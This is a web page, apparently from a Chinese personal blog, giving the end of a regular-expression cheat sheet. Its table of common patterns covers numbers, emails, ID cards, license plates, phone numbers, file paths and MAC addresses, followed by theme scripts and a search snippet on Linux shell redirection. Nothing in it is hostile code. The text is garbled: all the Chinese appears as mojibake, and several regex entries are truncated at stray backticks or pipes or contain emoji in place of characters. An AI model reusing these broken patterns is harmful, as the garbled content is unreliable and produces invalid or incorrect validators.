<td style="text-align:center">å¦‚æœnä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-3ï¼‰ï¼Œä¸”må’Œlå‡ä¸ºå…«è¿›åˆ¶æ•°å­—ï¼ˆ0-7ï¼‰ï¼Œåˆ™åŒ¹é…å…«è¿›åˆ¶è½¬ä¹‰å€¼nmlã€‚</td>
</tr>
<tr>
<td>\un</td>
<td style="text-align:center">åŒ¹é…nï¼Œå…¶ä¸­næ˜¯ä¸€ä¸ªç”¨å››ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºçš„Unicodeå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ\u00A9åŒ¹é…ç‰ˆæƒç¬¦å·ï¼ˆÂ©ï¼‰ã€‚</td>
</tr>
</tbody>
</table>
<h3 id="å¸¸ç”¨çš„æ­£åˆ™åŒ¹é…ä¸²">å¸¸ç”¨çš„æ­£åˆ™åŒ¹é…ä¸²</h3>
<table>
<thead>
<tr>
<th>Desc</th>
<th style="text-align:center">Rule</th>
</tr>
</thead>
<tbody>
<tr>
<td>éè´Ÿæ•´æ•°</td>
<td style="text-align:center"><code>/^\d+$/</code></td>
</tr>
<tr>
<td>æ­£æ•´æ•°</td>
<td style="text-align:center"><code>/^[1-9]\d*$/</code></td>
</tr>
<tr>
<td>æµ®ç‚¹æ•°</td>
<td style="text-align:center"><code>/^\d+\.\d+$/</code></td>
</tr>
<tr>
<td>è‹±æ–‡å­—æ¯</td>
<td style="text-align:center"><code>/^[a-zA-Z]+$/</code></td>
</tr>
<tr>
<td>å°æ•°é™åˆ¶ä¸¤ä½</td>
<td style="text-align:center"><code>/^\d+(\.\d{1,2})?$/</code></td>
</tr>
<tr>
<td>ä¸­æ–‡å­—ç¬¦éªŒè¯</td>
<td style="text-align:center"><code>/^([\u4E00-\u9FA5])+$/</code></td>
</tr>
<tr>
<td>èº«ä»½è¯å·</td>
<td style="text-align:center">`/^\d{15}</td>
</tr>
<tr>
<td>é‚®ç®±</td>
<td style="text-align:center"><code>/^[a-zA-Z0-9.!#$%&amp;'*+\/=?^_</code>{</td>
</tr>
<tr>
<td>è½¦ç‰Œå·</td>
<td style="text-align:center"><code>/^[äº¬æ´¥æ²ªæ¸å†€è±«äº‘è¾½é»‘æ¹˜çš–é²æ–°è‹æµ™èµ£é„‚æ¡‚ç”˜æ™‹è’™é™•å‰é—½è´µç²¤é’è—å·å®ç¼ä½¿é¢†A-Z]{1}[A-Z]{1}[A-Z0-9]{4}[A-Z0-9æŒ‚å­¦è­¦æ¸¯æ¾³]{1}$/</code></td>
</tr>
<tr>
<td>htmlæ ‡ç­¾</td>
<td style="text-align:center"><code>/&lt;(\w+)[^&gt;]*&gt;(.*?&lt;\/\1&gt;)?/</code></td>
</tr>
<tr>
<td>htmlæ³¨é‡Š</td>
<td style="text-align:center"><code>/^&lt;!--[\s\S]*?--&gt;$/</code></td>
</tr>
<tr>
<td>ç«è½¦è½¦æ¬¡</td>
<td style="text-align:center"><code>/^[GCDZTSPKXLY1-9]\d{1,4}$/</code></td>
</tr>
<tr>
<td>æ‰‹æœºå·-å›½å†…(å®½æ¾)</td>
<td style="text-align:center">`/^(?ğŸ˜¦?:+</td>
</tr>
<tr>
<td>åº§æœº(tel phone)ç”µè¯(å›½å†…)</td>
<td style="text-align:center">`/^\d{3}-\d{8}$</td>
</tr>
<tr>
<td>date(æ—¥æœŸ)</td>
<td style="text-align:center">`/^\d{4}(-)(1[0-2]</td>
</tr>
<tr>
<td>å¸å·ï¼Œ4åˆ°16ä½å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ï¼Œå‡å·</td>
<td style="text-align:center"><code>/^[a-zA-Z0-9_-]{4,16}$/</code></td>
</tr>
<tr>
<td>qqå·</td>
<td style="text-align:center"><code>/^[1-9][0-9]{4,10}$/</code></td>
</tr>
<tr>
<td>å¾®ä¿¡å·</td>
<td style="text-align:center"><code>/^[a-zA-Z][-_a-zA-Z0-9]{5,19}$/</code></td>
</tr>
<tr>
<td>ç»Ÿä¸€ç¤¾ä¼šä¿¡ç”¨ä»£ç </td>
<td style="text-align:center"><code>/^[0-9A-HJ-NPQRTUWXY]{2}\d{6}[0-9A-HJ-NPQRTUWXY]{10}$/</code></td>
</tr>
<tr>
<td>ed2ké“¾æ¥(å®½æ¾åŒ¹é…)</td>
<td style="text-align:center"><code>/^ed2k:\/\/|file|.+|\/$/</code></td>
</tr>
<tr>
<td>ç£åŠ›é“¾æ¥(å®½æ¾åŒ¹é…)</td>
<td style="text-align:center"><code>/^magnet:\?xt=urn:btih:[0-9a-fA-F]{40,}.*$/</code></td>
</tr>
<tr>
<td>å­ç½‘æ©ç </td>
<td style="text-align:center">`/^(?:\d{1,2}</td>
</tr>
<tr>
<td>linuxæ–‡ä»¶è·¯å¾„</td>
<td style="text-align:center"><code>/^\/(?:[^\/]+\/)*[^\/]+$/</code></td>
</tr>
<tr>
<td>linuxæ–‡ä»¶å¤¹è·¯å¾„</td>
<td style="text-align:center"><code>/^\/(?:[^\/]+\/)*$/</code></td>
</tr>
<tr>
<td>windowæ–‡ä»¶å¤¹è·¯å¾„</td>
<td style="text-align:center"><code>/^[a-zA-Z]:\\(?:\w+\\?)*$/</code></td>
</tr>
<tr>
<td>windowä¸‹æ–‡ä»¶è·¯å¾„</td>
<td style="text-align:center"><code>/^[a-zA-Z]:\\(?:\w+\\)*\w+\.\w+$/</code></td>
</tr>
<tr>
<td>è‚¡ç¥¨ä»£ç (Aè‚¡)</td>
<td style="text-align:center">`/^(s[hz]</td>
</tr>
<tr>
<td>md5æ ¼å¼(32ä½)</td>
<td style="text-align:center">`/^([a-f\d]{32}</td>
</tr>
<tr>
<td>ç‰ˆæœ¬å·, æ ¼å¼ä¸ºX.Y.Z</td>
<td style="text-align:center"><code>/^\d+(?:\.\d+){2}$/</code></td>
</tr>
<tr>
<td>è§†é¢‘(video)é“¾æ¥åœ°å€</td>
<td style="text-align:center">`/^https?://(.+/)+.+(.(swf</td>
</tr>
<tr>
<td>å›¾ç‰‡(image)é“¾æ¥åœ°å€ï¼ˆ</td>
<td style="text-align:center">`/^https?://(.+/)+.+(.(gif</td>
</tr>
<tr>
<td>24å°æ—¶åˆ¶æ—¶é—´ï¼ˆHH:mm:ssï¼‰</td>
<td style="text-align:center">`/^(?:[01]\d</td>
</tr>
<tr>
<td>12å°æ—¶åˆ¶æ—¶é—´ï¼ˆhh:mm:ssï¼‰</td>
<td style="text-align:center">`/^(?:1[0-2]</td>
</tr>
<tr>
<td>base64æ ¼å¼</td>
<td style="text-align:center"><code>/^\s*data:(?:[a-z]+\/[a-z0-9-+.]+(?:;[a-z-]+=[a-z0-9-]+)?)?(?:;base64)?,([a-z0-9!$&amp;',()*+;=\-._~:@\/?%\s]*?)\s*$/i</code></td>
</tr>
<tr>
<td>é“¶è¡Œå¡å·ï¼ˆ10åˆ°30ä½, è¦†ç›–å¯¹å…¬/ç§è´¦æˆ·, å‚è€ƒå¾®ä¿¡æ”¯ä»˜ï¼‰</td>
<td style="text-align:center"><code>/^[1-9]\d{9,29}$/</code></td>
</tr>
<tr>
<td>mac åœ°å€</td>
<td style="text-align:center">`/^((([a-f0-9]{2}ğŸ˜ƒ{5})</td>
</tr>
</tbody>
</table>

            </div>
            
            
              <div class="post-footer">
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong class="language" data-lan="author">æœ¬æ–‡ä½œè€…ï¼š</strong>
      STAy
    </li>
    <li class="post-copyright-link">
      <strong class="language" data-lan="link">æœ¬æ–‡é“¾æ¥ï¼š</strong>
      <a href="https://cactusii.github.io/post/zheng-ze-biao-da-shi-su-cha-biao/" title="æ­£åˆ™è¡¨è¾¾å¼é€ŸæŸ¥è¡¨">https://cactusii.github.io/post/zheng-ze-biao-da-shi-su-cha-biao/</a>
    </li>
    <li class="post-copyright-license">
      <strong class="language" data-lan="copyright">ç‰ˆæƒå£°æ˜ï¼š </strong>
      æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i> BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
    </li>
  </ul>
  <div class="tags">
    
  </div>
  <div class="nav">
    <div class="nav-prev">
      
        <i class="fa fa-chevron-left"></i>
        <a class="nav-pc-next" title="Internet/Unix socket" href="https://cactusii.github.io/post/internetunix-socket/">Internet/Unix socket</a class="nav-pc-next">
        <a class="nav-mobile-prev" title="Internet/Unix socket" href="https://cactusii.github.io/post/internetunix-socket/">ä¸Šä¸€ç¯‡</a>
      
    </div>
    <div class="nav-next">
      
        <a class="nav-pc-next" title="ã€å®¹å™¨ã€‘docker-ceã€docker-composeå®‰è£…" href="https://cactusii.github.io/post/rong-qi-docker-ce-an-zhuang/">ã€å®¹å™¨ã€‘docker-ceã€docker-composeå®‰è£…</a>
        <a class="nav-mobile-next" title="ã€å®¹å™¨ã€‘docker-ceã€docker-composeå®‰è£…" href="https://cactusii.github.io/post/rong-qi-docker-ce-an-zhuang/">ä¸‹ä¸€ç¯‡</a>
        <i class="fa fa-chevron-right"></i>
      
    </div>
  </div>
</div>
            
            
  <script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
<div id="vcomments" style="padding: 10px 0px 0px 0px"></div>

<style>
  .v .veditor {
    min-height: 10rem;
    background-image: url('');
    background-size: contain;
    background-repeat: no-repeat;
    background-position: right;
    background-color: rgba(255, 255, 255, 0);
    resize: none;
  }

  .v .vwrap {
    border: 1px solid #000 !important;
  }

  .v .vbtn {
    padding: .4rem 1.2rem !important;
    border-color: #fff !important;
    background-color: #49b1f5 !important;
    color: #fff !important;
    font-size: .7rem !important;
  }

  .v .vcards .vcard .vh .vmeta .vat {
    padding: 0 .8rem !important;
    border: 1px solid #00c4b6 !important;
    border-radius: 5px !important;
    color: #00c4b6 !important;
  }
</style>
<script>
  new Valine({
    el: '#vcomments',
    appId: '',
    appKey: '',
    avatar: '',
    placeholder: '',
    pageSize: '',
    lang: 'zh-cn',
    enableQQ: 'true' === 'false',
    visitor: 'true' === 'false',
    highlight: 'true' === 'true',
    avatarForce: 'true' === 'false',
  });
</script>

          </div>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <div class="copyright">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | Â© 2019-2020 Theme By <a
        href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
    </div>
    <div class="poweredby">
      
    </div>
  </footer>
  
  
  <div class="pisces back-to-top" id="back_to_top">
    <i class="fa fa-arrow-up"></i>
    
    <span class="scrollpercent">
      <span id="back_to_top_text">0</span>%
    </span>
    
  </div>
  
  
  
</div>
<script>

  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
    back2TopText = document.querySelector('#back_to_top_text'),
    drawerBox = document.querySelector('#drawer_box'),
    rightSideBar = document.querySelector('.sidebar'),
    viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {

    let needScrollTop = targetY - currentY
    let _currentY = currentY
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10)
      _currentY += dist
      window.scrollTo(_currentY, currentY)
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY)
      } else {
        window.scrollTo(_currentY, targetY)
      }
    }, 1)
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener('scroll', function (e) {
    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
      back2Top.classList.add('back-top-active');
    }
    if (percent == 0) {
      back2Top.classList.remove('back-top-active');
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });


  let hasCacu = false;
  window.onresize = function () {
    calcuHeight();
  }

  function calcuHeight() {
    // åŠ¨æ€è°ƒæ•´ç«™ç‚¹æ¦‚è§ˆé«˜åº¦
    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
      let sideBar = document.querySelector('.sidebar');
      let navUl = document.querySelector('#site_nav');
      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';

  if (drawerBox) {
    let rightMotions = document.querySelectorAll('.right-motion');
    let right = drawerBox.classList.contains('right');

    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingRight: '0px'
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingLeft: '0px'
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      window.Velocity(rightSideBar, 'stop');
      window.Velocity(viewport, 'stop');
      window.Velocity(rightMotions, 'stop');
      if (open) {
        window.Velocity(rightSideBar, {
          width: RIGHT_MOVE_DIS
        }, {
          duration: MOTION_TIME,
          begin: function () {
            window.Velocity(rightMotions, transitionDir, {});
          }
        })
        window.Velocity(viewport, openProp, {
          duration: MOTION_TIME
        });
      } else {
        window.Velocity(rightSideBar, {
          width: '0px'
        }, {
          duration: MOTION_TIME,
          begin: function () {
            window.Velocity(rightMotions, {
              opacity: 0
            });
          }
        })
        window.Velocity(viewport, closeProp, {
          duration: MOTION_TIME
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle('muse-line');
      }
      drawerBox.classList.toggle(sideBarOpen);
    }
  }

  // é“¾æ¥è·³è½¬
  let newWindow = 'true'
  if (newWindow === 'true') {
    let links = document.querySelectorAll('.post-body a')
    links.forEach(item => {
      if (!item.classList.contains('btn')) {
        item.setAttribute("target", "_blank");
      }
    })
  }

  let faSearch = document.querySelector('#fa_search');
  faSearch.addEventListener('click', function () {
    document.querySelector('#search_mask').style = ''
  })

  // ä»£ç é«˜äº®
  hljs.initHighlightingOnLoad();
  
  // ç¦»å¼€å½“å‰é¡µtitleå˜åŒ–
  var leaveTitle = "";
  if (leaveTitle) {
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState == 'hidden') {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }

</script>
    <div class="light-box" id="light_box"></div>
<script>
  let imgs = document.querySelectorAll('.post-body img');
  let lightBox = document.querySelector('#light_box');
  lightBox.addEventListener('mousedown', (e) => {
    e.preventDefault()
  })
  lightBox.addEventListener('mousewheel', (e) => {
    e.preventDefault()
  })
  let width = window.innerWidth * 0.8;
  lightBox.onclick = () => {
    let img = lightBox.querySelector('img');
    lightBox.style = '';
    img && img.remove();
  }
  imgs.forEach(item => {
    item.onclick = function (e) {
      let lightImg = document.createElement('img');
      lightImg.src = this.src;
      lightBox.style = `height: 100%; opacity: 1; background-color: rgba(0, 0, 0, 0.5);cursor: zoom-out;`;
      lightImg.style = `width: ${width}px;border-radius: 2px;`;
      lightImg.onclick = function () {
        lightBox.style = '';
        this.remove();
      }
      lightBox.append(lightImg);
    }
  })
</script>
    <div class="reward-mask" style="display: none;">
  <div class="reward-relative">
    <span class="close" aria-hidden="true">x</span>
    <div class="reward-body">
      <h2>æ„Ÿè°¢æ‚¨çš„æ”¯æŒï¼Œæˆ‘ä¼šç»§ç»­åŠªåŠ›çš„!</h2>
      <div class="reward-img-box">
        <div style="position: relative; width: 140px; height: 140px;">
          
          
          
        </div>
      </div>
      <p class="reward-word">æ‰«ç æ‰“èµï¼Œä½ è¯´å¤šå°‘å°±å¤šå°‘</p>
      <p class="reward-tip">æ‰“å¼€å¾®ä¿¡æ‰«ä¸€æ‰«ï¼Œå³å¯è¿›è¡Œæ‰«ç æ‰“èµå“¦</p>
    </div>
    <div class="bottom">
      
      
    </div>
  </div>
</div>
<style>
  .reward-mask {
    position: fixed;
    z-index: 99999;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: #00000054;
  }

  .reward-relative {
    position: relative;
    width: 480px;
    text-align: center;
    margin: 0 auto;
    border-radius: 5px;
    background-color: #fff;
    top: 50%;
    margin-top: -205px;
  }

  .reward-relative .close {
    position: absolute;
    right: 10px;
    font-weight: normal;
    font-size: 16px;
    color: #929292;
  }

  .reward-body {
    padding: 40px 20px 20px;
  }

  .bottom {
    display: flex;
  }

  .reward-btn {
    text-align: center;
  }

  .reward-btn-text {
    display: inline-block;
    cursor: pointer;
    width: 60px;
    height: 60px;
    line-height: 60px;
    border-radius: 50%;
    background-color: #ff9734;
    color: #FFF;
    margin-top: 20px;
  }

  .pay-text {
    margin-top: 10px;
    padding: 10px;
    flex: 1;
    transition: all .2s linear;
  }

  .pay-text:hover {
    background-color: #a5a5a536;
  }

  .reward-body h2 {
    padding-top: 10px;
    text-align: center;
    color: #a3a3a3;
    font-size: 16px;
    font-weight: normal;
    margin: 0 0 20px;
  }

  .reward-body h2:after,
  .reward-body h2:before {
    font-family: Arial, Helvetica, sans-serif;
    background: 0 0;
    width: 0;
    height: 0;
    font-style: normal;
    color: #eee;
    font-size: 80px;
    position: absolute;
    top: 20px;
  }

  .reward-body h2:before {
    content: '\201c';
    left: 50px;
  }

  .reward-body h2:after {
    content: '\201d';
    right: 80px;
  }

  .reward-img-box {
    display: inline-block;
    padding: 10px;
    border: 6px solid #ea5f00;
    margin: 0 auto;
    border-radius: 3px;
    position: relative;
  }

  .reward-img {
    position: absolute;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
  }

  @media (max-width: 767px) {
    .reward-relative {
      height: 100%;
      top: 0px;
      margin-top: 0;
      width: auto;
    }

    .reward-relative .bottom {
      flex-direction: column;
    }

    .reward-relative .pay-text {
      width: 80%;
      margin: 5px auto;
      border: 1px solid silver;
      padding: 6px;
      border-radius: 4px;
    }

    .reward-body h2:after {
      right: 40px;
    }

    .reward-body h2:after,
    .reward-body h2:before {
      font-size: 60px;
    }

    .reward-body h2:before {
      left: 20px;
    }
  }
</style>
<script>
  !function () {
    var mask = document.querySelector('.reward-mask');
    let close = document.querySelector('.reward-relative .close');
    let rewardBtn = document.querySelector('.reward-btn');

    let zfb = document.querySelector('#zfb'),
      wx = document.querySelector('#wx'),
      zfbBtn = document.querySelector('#zfbBtn'),
      wxBtn = document.querySelector('#wxBtn');

    if (zfbBtn && wxBtn) {
      zfbBtn.addEventListener('click', () => {
        window.Velocity(zfb, 'transition.slideLeftIn', {
          duration: 400
        });
        window.Velocity(wx, 'transition.slideRightOut', {
          display: 'none',
          duration: 400
        });
      });

      wxBtn.addEventListener('click', () => {
        window.Velocity(wx, 'transition.slideRightIn', {
          duration: 400
        });
        window.Velocity(zfb, 'transition.slideLeftOut', {
          display: 'none',
          duration: 400
        });
      });
    }

    rewardBtn.addEventListener('click', (e) => {
      window.Velocity(mask, 'transition.slideDownIn', {
        duration: 400
      })
    });

    close.addEventListener('click', (e) => {
      e.preventDefault();
      window.Velocity(mask, 'transition.slideUpOut', {
        duration: 400
      })
    })
  }()
</script>

  </div>
</body>

<div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="æœç´¢">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span><span class="language" data-lan="stat">æ¡ç›¸å…³æ¡ç›®ï¼Œä½¿ç”¨äº†</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">æ¯«ç§’</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-biao-zhun-shu-ru-shu-chu-cuo-wu-ji-chong-ding-xiang/"" data-c="
          &lt;h3 id=&#34;æ ‡å‡†è¾“å…¥è¾“å‡ºé”™è¯¯&#34;&gt;æ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯&lt;/h3&gt;
&lt;p&gt;linuxä¸‹æ¯ä¸ªè¿›ç¨‹åœ¨è¿è¡Œçš„è¿‡ç¨‹ä¸­éƒ½ä¼šæ‰“å¼€ä¸€ç³»åˆ—çš„æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡&lt;code&gt;lsof -p $pid&lt;/code&gt;æ¥æŸ¥çœ‹è¿›ç¨‹å·ä¸ºpidæ‰“å¼€çš„æ–‡ä»¶ï¼Œåœ¨&lt;code&gt;/proc/pid/fd/&lt;/code&gt;ä¸‹æ˜¯è¯¥è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶çš„é“¾æ¥ã€‚å…¶ä¸­æœ‰ä¸‰ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„æ–‡ä»¶æ˜¯æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šæ‰“å¼€ï¼Œå…¶æ–‡ä»¶æè¿°ç¬¦åˆ†ä¸º0ï¼Œ1ï¼Œ2ï¼Œé»˜è®¤åˆ†åˆ«é“¾æ¥åˆ°æ ‡å‡†è¾“å…¥(STDIN_FILENO)è®¾å¤‡(/dev/stdin)ã€æ ‡å‡†è¾“å‡º(STDOUT_FILENO)è®¾å¤‡(/dev/stdout)ã€æ ‡å‡†é”™è¯¯(STDERR_FILENO)(/dev/stderr)è®¾å¤‡ã€‚&lt;/p&gt;
&lt;p&gt;è¿›ç¨‹åœ¨è¿è¡Œçš„è¿‡ç¨‹ä¸­é»˜è®¤æƒ…å†µä¸‹äº§ç”Ÿçš„è¾“å‡ºä¼šå†™åˆ°stdoutæ–‡ä»¶ï¼Œäº§ç”Ÿçš„é”™è¯¯ä¿¡æ¯å†™åˆ°stderræ–‡ä»¶ï¼Œé»˜è®¤è¿™ä¸¤ä¸ªæ–‡ä»¶ä¼šé“¾æ¥åˆ°å±å¹•è®¾å¤‡ï¼Œè®¸å¤šè¿›ç¨‹ä»æ ‡å‡†è¾“å…¥stdinè·å–è¾“å…¥ï¼Œé»˜è®¤é“¾æ¥ä¸ºé”®ç›˜è®¾å¤‡ã€‚å¦‚æœæ›´æ”¹è¿™å‡ ä¸ªæ–‡ä»¶çš„é“¾æ¥ä½ç½®ï¼Œå°±å¯ä»¥å®ç°å¯¹å…¶ä»–æ–‡ä»¶çš„è¾“å…¥è¾“å‡ºã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ›´æ¢æ ‡å‡†è¾“å…¥è¾“å‡ºé”™è¯¯&#34;&gt;æ›´æ¢æ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt;: è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶æˆ–è®¾å¤‡ï¼Œè¦†ç›–åŸæ¥çš„å†…å®¹&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;: è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶æˆ–è®¾å¤‡ï¼Œè¿½åŠ åˆ°æœ«å°¾&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;: è¾“å…¥é‡å®šå‘ä¸€ä¸ªç¨‹åº&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;è¾“å‡º&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# echo hello &amp;gt; out.log
# echo hello 1&amp;gt; out.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸¤ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯ç›¸åŒçš„ï¼Œéƒ½æ˜¯è®²echoè¿›ç¨‹çš„è¾“å‡ºé‡å®šå‘åˆ°out.logæ–‡ä»¶ï¼Œåœ¨è¿™é‡Œ&amp;gt;å·¦è¾¹çš„1å¯ä»¥çœç•¥ã€‚&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;é”™è¯¯&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# echo hello 2&amp;gt; err.log
hello
# echoo hello 2&amp;gt; err.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2&amp;gt;è¡¨ç¤ºå°†è¿›ç¨‹çš„é”™è¯¯ä¿¡æ¯é‡å®šå‘åˆ°err.logæ–‡ä»¶ï¼Œç¬¬ä¸€è¡Œçš„å‘½ä»¤æ²¡æœ‰é”™è¯¯ä¿¡æ¯ï¼Œå› æ­¤ä¼šè¾“å‡ºhelloåˆ°æ ‡å‡†è¾“å‡ºï¼Œå³ä¼šæ˜¾ç¤ºåˆ°å±å¹•ä¸Šï¼Œç¬¬äºŒè¡Œè¾“å‡ºäº†ä¸€ä¸ªä¸å­˜åœ¨çš„æŒ‡ä»¤ï¼Œè¿™æ—¶çš„é”™è¯¯è¾“å‡ºä¿¡æ¯ä¼šè¾“å…¥åˆ°err.logä¸­ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœéœ€è¦æŠŠè¾“å‡ºä¿¡æ¯å’Œé”™è¯¯ä¿¡æ¯éƒ½é‡å®šå‘åˆ°æŸä¸ªæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# echoo hello 1&amp;gt; err.log 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œçš„1&amp;gt;å’Œå‰é¢çš„ç”¨æ³•ç›¸åŒï¼Œ2&amp;gt;&amp;amp;1æ˜¯å°†é”™è¯¯ä¿¡æ¯&lt;strong&gt;è¿½åŠ &lt;/strong&gt;åˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚&amp;gt;&amp;amp;æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œä¸å¯åˆ†å¼€ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€äº›ä¾‹å­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# é”™è¯¯ä¿¡æ¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œè¾“å‡ºé‡å®šå‘åˆ°out.log
# cat file 2&amp;gt;&amp;amp;1 &amp;gt;out.log
# å°†è¾“å‡ºé‡å®šå‘åˆ°out.logï¼Œé”™è¯¯å®šå‘åˆ°è¾“å‡º
# cat file &amp;gt;out.log 2&amp;gt;&amp;amp;1
# å°†é”™è¯¯å’Œè¾“å‡ºé‡å®šå‘æ›´ç®€å•çš„å†™æ³•
# cat file &amp;amp;&amp;gt; out.log
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;è¾“å…¥&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å°†ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥é‡å®šå‘ä¸ºå…¶ä»–æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# cat &amp;lt; file.in
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦å¤–è¿˜æœ‰ä¸€ç§&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;çš„æ–¹å¼ï¼Œç§°ä¸ºhereæ–‡æ¡£ï¼Œå®ƒä¼šä»æ ‡å‡†è¾“å…¥ä¸­æŒç»­è¯»å…¥å­—ç¬¦ï¼Œç›´åˆ°åŒ¹é…åˆ°æŒ‡å®šçš„tokenè¯»å–ç»“æŸã€‚ä¾‹å¦‚&lt;code&gt;cat&lt;/code&gt;å‘½ä»¤ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;cat &amp;lt;&amp;lt; EOF &amp;gt; out.log
&amp;gt; hello
&amp;gt; world
&amp;gt; EOF
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ç§æ–¹å¼æ˜¯å°†cat å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°out.logä¸­ï¼Œå…¶å†…å®¹æ˜¯ä»ç¬¬äºŒè¡Œå¼€å§‹åˆ°EOFä¹‹å‰ç»“æŸï¼ŒEOFæ˜¯ç»“æŸtokenï¼Œå¯ä»¥äººä¸ºæŒ‡å®šä¸ºå…¶ä»–å­—ç¬¦ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;cat &amp;lt;&amp;lt; ENDOFFILE &amp;gt; out.log
&amp;gt; 1
&amp;gt; 2
&amp;gt; 3
&amp;gt; ENDOFFILE
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦ä¸€ç§å†™æ³•æ˜¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;cat &amp;gt; out.log &amp;lt;&amp;lt; EOF
&amp;gt; 1
&amp;gt; 2
&amp;gt; 3
&amp;gt; ENDOFFILE
&lt;/code&gt;&lt;/pre&gt;
